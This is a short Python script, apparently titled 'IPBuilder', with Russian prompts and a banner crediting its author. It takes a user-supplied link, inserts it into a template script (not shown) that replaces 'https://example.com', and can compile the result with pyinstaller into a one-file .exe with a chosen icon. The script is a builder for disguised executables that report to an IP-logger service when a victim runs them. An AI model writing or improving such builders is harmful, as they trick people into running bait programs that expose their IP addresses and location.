import os
import subprocess
import shutil

def create_and_run_script():
    print('''
 ___  _   _                      | создано: @userdeza
  |  |_) |_)     o |  _|  _  ._  | IPBuilder предназначен 
 _|_ |   |_) |_| | | (_| (/_ |   | для создания програм для IPLOGGER 

''')
    url = input("Введите ссылку: ")

    filename = input("Введите имя файла (без расширения): ") + ".py"

    icon_choice = input("Хотите ли вы добавить иконку? (y/n): ").strip().lower()
    if icon_choice == 'y':
        icon = input("Введите путь к иконке: ")
    else:
        icon = None

    pyinstaller_choice = input("Хотите ли вы создать исполнимый файл с помощью pyinstaller? (y/n): ").strip().lower()

    with open("enter.txt", "r", encoding="utf-8") as f:
        script_content = f.read()

    updated_script = script_content.replace("https://example.com", url)

    with open(filename, "w", encoding="utf-8") as f:
        f.write(updated_script)
    
    print(f"Файл {filename} был успешно создан с новой ссылкой!")

    if pyinstaller_choice == 'y':
        pyinstaller_command = ["pyinstaller", "--onefile", filename]
        
        if icon:
            pyinstaller_command += ["--icon", icon]  # Добавление иконки, если она указана

        subprocess.run(pyinstaller_command)

        output_folder = "dist"
        output_path = f"{output_folder}/{filename.replace('.py', '')}"

        if not os.path.exists("output"):
            os.makedirs("output")

        if os.path.exists(output_path):
            shutil.move(output_path, f"output/{filename.replace('.py', '')}.exe")
            print(f"Готовый файл был перемещён в папку 'output' под именем {filename.replace('.py', '')}.exe")
        else:
            print("Ошибка: Исполнимый файл не был создан.")
    else:
        print("Исполнимый файл не будет создан, только Python скрипт.")

os.system('cls' if os.name == 'nt' else 'clear')

create_and_run_script()
